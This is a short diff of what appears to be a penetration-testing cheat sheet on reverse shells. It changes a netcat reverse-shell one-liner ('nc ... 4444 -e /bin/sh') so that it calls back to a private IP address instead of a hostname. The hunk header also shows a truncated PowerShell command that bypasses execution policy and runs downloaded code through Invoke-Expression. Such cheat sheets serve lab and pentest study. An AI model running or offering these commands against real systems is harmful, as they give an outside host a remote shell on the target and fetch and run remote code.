@@ -87,7 +87,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 ## 3.1. Simply nc back (if netcat is installed on target machine)
 
 ```console
-nc -nv kali.vx 4444 -e /bin/sh
+nc -nv 192.168.17.10 4444 -e /bin/sh
 ```
 
 ### 3.2. Execute Linux reverse shell TCP payload
